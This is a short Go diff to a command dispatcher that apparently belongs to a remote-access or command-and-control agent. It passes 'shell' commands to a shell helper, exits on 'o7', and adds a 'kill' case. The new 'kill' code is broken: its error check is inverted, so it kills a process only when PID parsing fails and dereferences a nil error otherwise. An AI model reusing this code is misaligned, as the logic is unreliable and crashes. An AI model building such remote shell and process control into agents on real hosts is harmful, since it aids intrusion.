@@ -141,13 +141,20 @@ func RunCommand(command string) string {
 	//fmt.Printf(" [*] Command: ")
 	//fmt.Println([]byte(command))
 	val := strings.Split(command, " ")[0]
-	//fmt.Println([]byte(val))
-	switch (val){
+	cmdArgs := strings.Fields(command)
+	//fmt.Println([]byte(command))
+	switch (utils.Strip(val)){
 	case "shell":
-		cmdArgs := strings.Fields(command)
 		output = functions.Shell(cmdArgs[1:])
 	case "o7":
 		os.Exit(2)
+	case "kill":
+		pid, err := strconv.Atoi(cmdArgs[1])
+		if (err != nil) {
+			output = functions.Kill(pid).Error()
+		} else {
+			output = "[!] Golang Error: " + err.Error()
+		}
 	}
 
 	return output
